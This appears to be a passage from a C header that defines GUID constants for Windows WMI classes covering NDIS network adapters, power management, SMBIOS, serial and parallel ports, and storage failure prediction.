#define MSNdis_MacOptionsGuid {0x5ec10365,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_MaximumFrameSizeGuid {0x5ec10358,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_MaximumLookaheadGuid {0x5ec10357,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_MaximumSendPacketsGuid {0x5ec10367,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_MaximumTotalSizeGuid {0x5ec10363,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_MediaConnectStatusGuid {0x5ec10366,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_MediaInUseGuid {0x5ec10356,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_MediaSupportedGuid {0x5ec10355,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_NdisEnumerateVcGuid {0x981f2d82,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_NetworkAddressGuid {0xb5bd98b7,0x0201,0x11d1, {0xa5,0x0e,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSNdis_NetworkLinkSpeedGuid {0x60fc6b57,0x0f66,0x11d1, {0x96,0xa7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_NetworkShortAddressGuid {0xb5bd98b8,0x0201,0x11d1, {0xa5,0x0e,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSNdis_NicSwitchCapabilitiesGuid {0xdb80dd1c,0x59ae,0x48e7, {0xb7,0xec,0xf9,0xbe,0x2c,0x4b,0x8c,0xb0}}
#define MSNdis_NotifyAdapterArrivalGuid {0x981f2d81,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_NotifyAdapterRemovalGuid {0x981f2d80,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_NotifyFilterArrivalGuid {0x0b6d3c89,0x5917,0x43ca, {0xb5,0x78,0xd0,0x1a,0x79,0x67,0xc4,0x1c}}
#define MSNdis_NotifyFilterRemovalGuid {0x1f177cd9,0x5955,0x4721, {0x9f,0x6a,0x78,0xeb,0xdf,0xae,0xf8,0x89}}
#define MSNdis_NotifyVcArrivalGuid {0x182f9e0c,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_NotifyVcRemovalGuid {0x981f2d79,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_ObjectHeaderGuid {0x2b1831b2,0x2216,0x4ede, {0xa4,0x69,0x9f,0xe3,0xdd,0x6d,0x5a,0x7e}}
#define MSNdis_PMAdminConfigGuid {0x1528d111,0x708a,0x4ca4, {0x92,0x15,0xc0,0x57,0x71,0x16,0x1c,0xda}}
#define MSNdis_PMAdminConfigParamGuid {0x492dc449,0x13d9,0x4bd6, {0x89,0xd4,0x96,0xe3,0x53,0x4e,0x6a,0x05}}
#define MSNdis_PMAdminConfigStateGuid {0x0cffd0fc,0x8333,0x4000, {0x9a,0x3b,0x20,0x07,0x35,0xd6,0x98,0xf9}}
#define MSNdis_PMCapabilitiesGuid {0xb2cf76e3,0xb3ae,0x4394, {0xa0,0x1f,0x33,0x8c,0x98,0x70,0xe9,0x39}}
#define MSNdis_PMCapabilitiesParamGuid {0xcccb122d,0xd5c4,0x4ee1, {0x80,0x01,0xb8,0xad,0x6d,0x3c,0xe8,0x76}}
#define MSNdis_PMCapabilityStateGuid {0xc1cc6857,0x1a26,0x4f6d, {0xab,0x98,0x29,0x1f,0x0c,0x3b,0xbd,0x4c}}
#define MSNdis_PciDevicePropertyGuid {0x0573f70f,0xded8,0x401c, {0x8b,0x56,0xa6,0x2b,0xb5,0x28,0xc0,0xe2}}
#define MSNdis_PhysicalMediumTypeGuid {0x418ca16d,0x3937,0x4208, {0x94,0x0a,0xec,0x61,0x96,0x27,0x80,0x85}}
#define MSNdis_PortArrayGuid {0x0fee8708,0xdf65,0x456e, {0xb4,0xca,0xfa,0x62,0x32,0x66,0xa1,0x2a}}
#define MSNdis_PortAuthParametersGuid {0x5c3bda24,0x8b64,0x4829, {0xa5,0x87,0x8c,0xe7,0x19,0x15,0x2f,0xe2}}
#define MSNdis_PortCharGuid {0xf5b7d202,0xe594,0x4aa3, {0xbe,0x43,0x49,0x76,0x83,0x3c,0x78,0x40}}
#define MSNdis_PortStateDataGuid {0x8feae2c6,0xee28,0x469f, {0x8b,0x5d,0x9f,0x74,0x3b,0xab,0x21,0xaa}}
#define MSNdis_QueryInterruptModerationGuid {0xd9c8eea5,0xf16e,0x467c, {0x84,0xd5,0x63,0x45,0xa2,0x2c,0xe2,0x13}}
#define MSNdis_QueryNicSwitchCurrentCapabilitiesGuid {0xe76fdaf3,0x0be7,0x4d95, {0x87,0xe9,0x5a,0xea,0xd4,0xb5,0x90,0xe9}}
#define MSNdis_QueryNicSwitchHardwareCapabilitiesGuid {0x37cab40c,0xd1e8,0x4301, {0x8c,0x1d,0x58,0x46,0x5e,0x0c,0x4c,0x0f}}
#define MSNdis_QueryPciDeviceCustomPropertyGuid {0xaa39f5ab,0xe260,0x4d01, {0x82,0xb0,0xb7,0x37,0xc8,0x80,0xea,0x05}}
#define MSNdis_QueryPhysicalMediumTypeExGuid {0x899e7782,0x035b,0x43f9, {0x8b,0xb6,0x2b,0x58,0x97,0x16,0x12,0xe5}}
#define MSNdis_QueryPortStateGuid {0x6fbf2a5f,0x8b8f,0x4920, {0x81,0x43,0xe6,0xc4,0x60,0xf5,0x25,0x24}}
#define MSNdis_QueryReceiveFilterCurrentCapabilitiesGuid {0x4054e80f,0x2bc1,0x4ccc, {0xb0,0x33,0x4a,0xbc,0x0c,0x4a,0x1e,0x8c}}
#define MSNdis_QueryReceiveFilterGlobalParametersGuid {0x3f2c141a,0x83bc,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_QueryReceiveFilterHardwareCapabilitiesGuid {0x3f2c1419,0x83bc,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_QueryReceiveFilterParametersGuid {0x3f2c141e,0x83bc,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_QueryReceiveQueueParametersGuid {0x3f2c141c,0x83bc,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_QueryStatisticsInfoGuid {0x368c45b5,0xc129,0x43c1, {0x93,0x9e,0x7e,0xdc,0x2d,0x7f,0xe6,0x21}}
#define MSNdis_RSSEnabledGuid {0x9565cd55,0x3402,0x4e32, {0xa5,0xb6,0x2f,0x14,0x3f,0x2f,0x2c,0x30}}
#define MSNdis_ReceiveBlockSizeGuid {0x5ec1035d,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_ReceiveBufferSpaceGuid {0x5ec1035b,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_ReceiveErrorGuid {0x447956fd,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_ReceiveFilterCapabilitiesGuid {0x146360a3,0x88dd,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveFilterFieldParametersGuid {0x146360ab,0x88dd,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveFilterGlobalParametersGuid {0x146360a4,0x88dd,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveFilterInfoArrayGuid {0x146360aa,0x88dd,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveFilterInfoGuid {0x146360a9,0x88dd,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveFilterParametersGuid {0x146360ac,0x88dd,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveNoBufferGuid {0x447956fe,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_ReceiveQueueInfoArrayGuid {0xf786fbd8,0xc049,0x11dd, {0xb8,0x85,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveQueueInfoGuid {0xf786fbd7,0xc049,0x11dd, {0xb8,0x85,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveQueueParametersGuid {0xf786fbd6,0xc049,0x11dd, {0xb8,0x85,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_ReceiveScaleCapabilitiesGuid {0x26c28774,0x4252,0x48fe, {0xa6,0x10,0xa5,0x8a,0x39,0x8c,0x0e,0xb1}}
#define MSNdis_ReceivesOkGuid {0x447956fb,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_SetHDSplitParametersGuid {0x8c048bea,0x2913,0x4458, {0xb6,0x8e,0x17,0xf6,0xc1,0xe5,0xc6,0x0e}}
#define MSNdis_SetInterruptModerationGuid {0xd789adfa,0x9c56,0x433b, {0xad,0x01,0x75,0x74,0xf3,0xce,0xdb,0xe9}}
#define MSNdis_SetLinkParametersGuid {0x8c7d3579,0x252b,0x4614, {0x82,0xc5,0xa6,0x50,0xda,0xa1,0x50,0x49}}
#define MSNdis_SetPortParametersGuid {0xaab6ac31,0x86fb,0x48fb, {0x8b,0x48,0x63,0xdb,0x23,0x5a,0xce,0x16}}
#define MSNdis_SetTcpOffloadParametersGuid {0x8ead9a22,0x7f69,0x4bc6, {0x94,0x9a,0xc8,0x18,0x7b,0x07,0x4e,0x61}}
#define MSNdis_StatisticsInfoGuid {0x8ecc74e1,0xba85,0x482e, {0xaf,0xaf,0xb4,0xf8,0xb0,0x87,0xc0,0x6b}}
#define MSNdis_StatusDevicePowerOffExGuid {0x4159353c,0x5cd7,0x42ce, {0x8f,0xe4,0xa4,0x5a,0x23,0x80,0xcc,0x4f}}
#define MSNdis_StatusDevicePowerOffGuid {0x81bc8189,0xb026,0x46ab, {0x64,0xb9,0xf1,0x82,0xe3,0x42,0x93,0x4e}}
#define MSNdis_StatusDevicePowerOnExGuid {0x2b440188,0x92ac,0x4f60, {0x9b,0x2d,0x20,0xa3,0x0c,0xbb,0x6b,0xbe}}
#define MSNdis_StatusDevicePowerOnGuid {0x5f81cfd0,0xf046,0x4342, {0x61,0xaf,0x89,0x5a,0xce,0xda,0xef,0xd9}}
#define MSNdis_StatusDot11AssociationCompletionGuid {0x458bbea7,0x45a4,0x4ae2, {0xb1,0x76,0xe5,0x1f,0x96,0xfc,0x05,0x68}}
#define MSNdis_StatusDot11AssociationStartGuid {0x3927843b,0x6980,0x4b48, {0xb1,0x5b,0x4d,0xe5,0x09,0x77,0xac,0x40}}
#define MSNdis_StatusDot11ConnectionCompletionGuid {0x96efd9c9,0x7f1b,0x4a89, {0xbc,0x04,0x3e,0x9e,0x27,0x17,0x65,0xf1}}
#define MSNdis_StatusDot11ConnectionStartGuid {0x7b74299d,0x998f,0x4454, {0xad,0x08,0xc5,0xaf,0x28,0x57,0x6d,0x1b}}
#define MSNdis_StatusDot11DisassociationGuid {0x3fbeb6fc,0x0fe2,0x43fd, {0xb2,0xad,0xbd,0x99,0xb5,0xf9,0x3e,0x13}}
#define MSNdis_StatusDot11LinkQualityGuid {0xa3285184,0xea99,0x48ed, {0x82,0x5e,0xa4,0x26,0xb1,0x1c,0x27,0x54}}
#define MSNdis_StatusDot11MPDUMaxLengthChangeGuid {0x1d6560ec,0x8e48,0x4a3e, {0x9f,0xd5,0xa0,0x1b,0x69,0x8d,0xb6,0xc5}}
#define MSNdis_StatusDot11PhyStateChangeGuid {0xdeb45316,0x71b5,0x4736, {0xbd,0xef,0x0a,0x9e,0x9f,0x4e,0x62,0xdc}}
#define MSNdis_StatusDot11PmkidCandidateListGuid {0x26d8b8f6,0xdb82,0x49eb, {0x8b,0xf3,0x4c,0x13,0x0e,0xf0,0x69,0x50}}
#define MSNdis_StatusDot11RoamingCompletionGuid {0xdd9d47d1,0x282b,0x41e4, {0xb9,0x24,0x66,0x36,0x88,0x17,0xfc,0xd3}}
#define MSNdis_StatusDot11RoamingStartGuid {0xb2412d0d,0x26c8,0x4f4e, {0x93,0xdf,0xf7,0xb7,0x05,0xa0,0xb4,0x33}}
#define MSNdis_StatusDot11ScanConfirmGuid {0x8500591e,0xa0c7,0x4efb, {0x93,0x42,0xb6,0x74,0xb0,0x02,0xcb,0xe6}}
#define MSNdis_StatusDot11TkipmicFailureGuid {0x442c2ae4,0x9bc5,0x4b90, {0xa8,0x89,0x45,0x5e,0xf2,0x20,0xf4,0xee}}
#define MSNdis_StatusHDSplitCurrentConfigGuid {0x6c744b0e,0xee9c,0x4205, {0x90,0xa2,0x01,0x5f,0x6d,0x65,0xf4,0x03}}
#define MSNdis_StatusLinkSpeedChangeGuid {0x981f2d85,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_StatusLinkStateGuid {0x64c6f797,0x878c,0x4311, {0x92,0x46,0x65,0xdb,0xa8,0x9c,0x3a,0x61}}
#define MSNdis_StatusMediaConnectGuid {0x981f2d7d,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_StatusMediaDisconnectGuid {0x981f2d7e,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_StatusMediaSpecificIndicationExGuid {0xaaacfca7,0x954a,0x4632, {0xa1,0x6e,0xa8,0xa6,0x37,0x93,0xa9,0xe5}}
#define MSNdis_StatusMediaSpecificIndicationGuid {0x981f2d84,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_StatusNetworkChangeGuid {0xca8a56f9,0xce81,0x40e6, {0xa7,0x0f,0xa0,0x67,0xa4,0x76,0xe9,0xe9}}
#define MSNdis_StatusOperationalStatusGuid {0xf917b663,0x845e,0x4d3d, {0xb6,0xd4,0x15,0xeb,0x27,0xaf,0x81,0xc5}}
#define MSNdis_StatusPacketFilterChangeGuid {0xd47c5407,0x2e75,0x46dd, {0x81,0x46,0x1d,0x7e,0xd2,0xd6,0xab,0x1d}}
#define MSNdis_StatusPortStateGuid {0x1dac0dfe,0x43e5,0x44b7, {0xb7,0x59,0x7b,0xf4,0x6d,0xe3,0x2e,0x81}}
#define MSNdis_StatusProtocolBindGuid {0x5413531c,0xb1f3,0x11d0, {0xd7,0x8d,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_StatusProtocolUnbindGuid {0x6e3ce1ec,0xb1f3,0x11d0, {0xd7,0x8d,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_StatusResetEndGuid {0x981f2d77,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_StatusResetStartGuid {0x981f2d76,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_StatusTaskOffloadChangeGuid {0x45049fc6,0x54d8,0x40c8, {0x9c,0x3d,0xb0,0x11,0xc4,0xe7,0x15,0xbc}}
#define MSNdis_TcpConnectionOffloadCurrentConfigGuid {0x2ee6aef1,0x0851,0x458b, {0xbf,0x0d,0x79,0x23,0x43,0xd1,0xcd,0xe1}}
#define MSNdis_TcpConnectionOffloadHardwareConfigGuid {0x8ce71f2c,0xd63a,0x4390, {0xa4,0x87,0x18,0xfa,0x47,0x26,0x2c,0xeb}}
#define MSNdis_TcpOffloadCurrentConfigGuid {0x68542fed,0x5c74,0x461e, {0x89,0x34,0x91,0xc6,0xf9,0xc6,0x09,0x60}}
#define MSNdis_TcpOffloadHardwareConfigGuid {0xcd5f1102,0x590f,0x4ada, {0xab,0x65,0x5b,0x31,0xb1,0xdc,0x01,0x72}}
#define MSNdis_TcpOffloadParametersGuid {0x43fe82d8,0x3468,0x497e, {0x9d,0xcf,0xf8,0xff,0xc0,0x13,0x37,0x44}}
#define MSNdis_TokenRingCurrentAddressGuid {0x44795708,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TokenRingCurrentFunctionalGuid {0x44795709,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TokenRingCurrentGroupGuid {0x4479570a,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TokenRingCurrentRingStateGuid {0xacf14032,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TokenRingCurrentRingStatusGuid {0x890a36ec,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TokenRingLastOpenStatusGuid {0x4479570b,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TokenRingLineErrorsGuid {0xacf14033,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TokenRingLostFramesGuid {0xacf14034,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TokenRingPermanentAddressGuid {0x44795707,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TransmitBlockSizeGuid {0x5ec1035c,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TransmitBufferSpaceGuid {0x5ec1035a,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TransmitsErrorGuid {0x447956fc,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_TransmitsOkGuid {0x447956fa,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_VendorDescriptionGuid {0x5ec1035f,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_VendorDriverVersionGuid {0x447956f9,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_VendorIDGuid {0x5ec1035e,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_VlanIdentifierGuid {0x765dc702,0xc5e8,0x4b67, {0x84,0x3b,0x3f,0x5a,0x4f,0xf2,0x64,0x8b}}
#define MSNdis_WmiEnumAdapterGuid {0xe7001b59,0xc3d6,0x4537, {0xb4,0x0e,0xa1,0x63,0xd5,0x16,0xe4,0xa3}}
#define MSNdis_WmiHDSplitCurrentConfigGuid {0x34ff16bf,0x30ca,0x4a2a, {0xa4,0x6d,0xc7,0xee,0x74,0xbc,0x35,0x82}}
#define MSNdis_WmiIPSecOffloadV1Guid {0x4ec63447,0x2238,0x43a7, {0xac,0x33,0x11,0xc7,0xcc,0x7d,0x86,0x65}}
#define MSNdis_WmiIPSecOffloadV1_IPv4AHGuid {0x29bacfdd,0xf063,0x48d8, {0x95,0x2c,0xd3,0xdc,0x93,0x30,0x0f,0x15}}
#define MSNdis_WmiIPSecOffloadV1_IPv4ESPGuid {0x86522023,0x4536,0x4b58, {0xa1,0xf4,0x25,0x38,0x94,0x1a,0xce,0x43}}
#define MSNdis_WmiIPSecOffloadV1_SupportedGuid {0xf86676b9,0xd9fa,0x4d26, {0x95,0xce,0xbf,0xbc,0x77,0xd8,0x05,0x96}}
#define MSNdis_WmiMethodHeaderGuid {0xe3eac9dd,0x2fd3,0x4963, {0xbf,0xfd,0xb4,0x69,0x28,0x88,0xc0,0xd4}}
#define MSNdis_WmiOffloadGuid {0x7a877086,0x2204,0x4a8a, {0x92,0xa4,0xe3,0xe8,0xab,0x62,0x66,0x29}}
#define MSNdis_WmiOutputInfoGuid {0x7510bb9d,0xdf70,0x4f7e, {0xba,0x07,0xe2,0x9d,0x33,0x0b,0x3c,0xc5}}
#define MSNdis_WmiReceiveScaleCapabilitiesGuid {0xf7a4960a,0xace3,0x44dc, {0xb5,0x1e,0x72,0xe0,0x5c,0x5e,0xaf,0xa8}}
#define MSNdis_WmiSetHeaderGuid {0x3b5605d8,0x1aaf,0x4ff6, {0x85,0xb9,0xbc,0x5f,0xb9,0x73,0xdc,0x54}}
#define MSNdis_WmiTcpConnectionOffloadGuid {0x93cfcd3f,0x6228,0x455c, {0x90,0x5e,0x3a,0xb8,0x0a,0x2f,0xf0,0x90}}
#define MSNdis_WmiTcpIpChecksumOffloadGuid {0x189d4015,0x1b25,0x4d8e, {0xa4,0xa9,0xf9,0xeb,0xa8,0x21,0x97,0xc7}}
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceiveGuid {0xd63d537a,0x59c1,0x4fae, {0x8f,0x9b,0xcd,0x9f,0xbb,0xec,0xb8,0x5a}}
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceiveGuid {0xb9760e75,0x6662,0x49e4, {0xaa,0x6c,0xf0,0x28,0xbe,0xfe,0xc8,0xee}}
#define MSNdis_WmiTcpLargeSendOffloadV1Guid {0xb9e4e2f9,0xee89,0x4756, {0xb0,0x57,0x38,0xf9,0xd9,0xb5,0x9a,0x92}}
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4Guid {0xd7673b11,0xe892,0x4a9d, {0x8b,0xd8,0x76,0x1f,0xf2,0x56,0xed,0xd9}}
#define MSNdis_WmiTcpLargeSendOffloadV2Guid {0x592977c2,0xcfbe,0x462c, {0xb5,0xcf,0x1a,0x76,0x79,0xfe,0x1c,0xba}}
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv4Guid {0x8823d030,0xfa30,0x4b73, {0xb3,0x39,0xdb,0x19,0x20,0x7f,0x0d,0x81}}
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6Guid {0xa7a9597c,0x2f8e,0x410b, {0x9b,0xb3,0x5c,0x3a,0x50,0x79,0x2b,0xfc}}
#define MSPower_DeviceEnableGuid {0x827c0a6f,0xfeb0,0x11d0, {0xbd,0x26,0x00,0xaa,0x00,0xb7,0xb3,0x2a}}
#define MSPower_DeviceWakeEnableGuid {0xa9546a82,0xfeb0,0x11d0, {0xbd,0x26,0x00,0xaa,0x00,0xb7,0xb3,0x2a}}
#define MSSmBios_RawSMBiosTablesGuid {0x8f680850,0xa584,0x11d1, {0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSSmBios_SMBiosEventlogGuid {0x8f680851,0xa584,0x11d1, {0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSSmBios_Sysid1394Guid {0x8f680854,0xa584,0x11d1, {0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSSmBios_SysidUUIDGuid {0x8f680852,0xa584,0x11d1, {0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSVerifierIrpLogEntryGuid {0x45068237,0x595d,0x4c7d, {0xbd,0x80,0xf8,0x4a,0xdc,0x02,0x57,0xf8}}
#define MSVerifierIrpLogInformationGuid {0x1e2c2980,0xf7db,0x46aa, {0x82,0x0e,0x87,0x34,0xfc,0xc2,0x1f,0x4c}}
#define MSWmi_GuidGuid {0xf8c60aed,0xef8d,0x4f95, {0x9e,0xa8,0xf0,0x43,0x18,0xa0,0x0f,0x30}}
#define MSWmi_GuidRegistrationInfoGuid {0xb48d49a1,0xe777,0x11d0, {0xa5,0x0c,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSWmi_MofDataGuid {0x05901221,0xd566,0x11d1, {0xb2,0xf0,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSWmi_ProviderInfoGuid {0xc7bf35d0,0xaadb,0x11d1, {0xbf,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define PARALLEL_WMI_BYTES_TRANSFERRED_GUID {0x89fef2d6,0x654b,0x11d2, {0x9e,0x15,0x00,0xc0,0x4f,0x8e,0xf4,0x81}}
#define PARPORT_WMI_ALLOCATE_FREE_COUNTS_GUID {0x4bbb69ea,0x6853,0x11d2, {0x8e,0xce,0x00,0xc0,0x4f,0x8e,0xf4,0x81}}
#define POINTER_PORT_WMI_STD_DATA_GUID {0x4731f89c,0x71cb,0x11d1, {0xa5,0x2c,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define ProcessorPerformanceGuid {0x7fd18652,0x0cfe,0x40d2, {0xb0,0xa1,0x0b,0x06,0x6a,0x87,0x75,0x9e}}
#define RegisteredGuidsGuid {0xe3dff7bd,0x3915,0x11d2, {0x91,0x03,0x00,0xc0,0x4f,0xb9,0x98,0xa2}}
#define SERIAL_PORT_WMI_COMM_GUID {0xedb16a62,0xb16c,0x11d1, {0xbd,0x98,0x00,0xa0,0xc9,0x06,0xbe,0x2d}}
#define SERIAL_PORT_WMI_HW_GUID {0x270b9b86,0xb16d,0x11d1, {0xbd,0x98,0x00,0xa0,0xc9,0x06,0xbe,0x2d}}
#define SERIAL_PORT_WMI_NAME_GUID {0xa0ec11a8,0xb16c,0x11d1, {0xbd,0x98,0x00,0xa0,0xc9,0x06,0xbe,0x2d}}
#define SERIAL_PORT_WMI_PERF_GUID {0x56415acc,0xb16d,0x11d1, {0xbd,0x98,0x00,0xa0,0xc9,0x06,0xbe,0x2d}}
#define SERIAL_PORT_WMI_PROPERTIES_GUID {0x8209ec2a,0x2d6b,0x11d2, {0xba,0x49,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define SYSID_1394_DATA_GUID {0x8f680855,0xa584,0x11d1, {0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define SYSID_UUID_DATA_GUID {0x8f680853,0xa584,0x11d1, {0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define VideoModeDescriptorGuid {0x4a97ed30,0xbfaa,0x491a, {0x9d,0xfd,0xb4,0x3a,0xde,0xdb,0xf8,0xe3}}
#define WHEAErrorInjectionMethodsGuid {0xe808ff73,0x2093,0x472a, {0xa5,0xcc,0xdf,0x24,0xf0,0x31,0xb0,0x35}}
#define WHEAErrorSourceMethodsGuid {0x91c3c007,0x185d,0x4d78, {0xa7,0x51,0xbf,0xcb,0x31,0xc2,0xc6,0x4d}}
#define WMI_ATAPI_FAILURE_PREDICT_DATA_GUID {0x78ebc103,0x4cf9,0x11d2, {0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define WMI_CHANGER_PARAMETERS_GUID {0x24eb52ac,0x7c77,0x438b, {0xab,0x61,0xd0,0x24,0xda,0xb0,0xc0,0x3a}}
#define WMI_CHANGER_PROBLEM_DEVICE_ERROR_GUID {0x56b396a8,0x0b95,0x42fe, {0xbb,0xce,0xd3,0x6f,0xda,0x90,0x4f,0x8e}}
#define WMI_CHANGER_PROBLEM_WARNING_GUID {0x45db06a5,0x20d5,0x4de3, {0xa3,0x6c,0x3a,0xb9,0x74,0x60,0x0a,0x4c}}
#define WMI_STORAGE_FAILURE_PREDICT_DATA_GUID {0x78ebc103,0x4cf9,0x11d2, {0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define WMI_STORAGE_FAILURE_PREDICT_FUNCTION_GUID {0x78ebc105,0x4cf9,0x11d2, {0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define WMI_STORAGE_FAILURE_PREDICT_STATUS_GUID {0x78ebc102,0x4cf9,0x11d2, {0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define WMI_STORAGE_FAILURE_PREDICT_THRESHOLDS_GUID {0xdae10783,0xcc31,0x4d2a, {0x8a,0x0f,0x86,0x1c,0x04,0x07,0x7a,0x95}}
#define WMI_STORAGE_PREDICT_FAILURE_EVENT_GUID {0x78ebc104,0x4cf9,0x11d2, {0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define WMI_STORAGE_SCSI_INFO_EXCEPTIONS_GUID {0x1101d829,0x167b,0x4ebf, {0xac,0xae,0x28,0xca,0xb7,0xc3,0x48,0x02}}
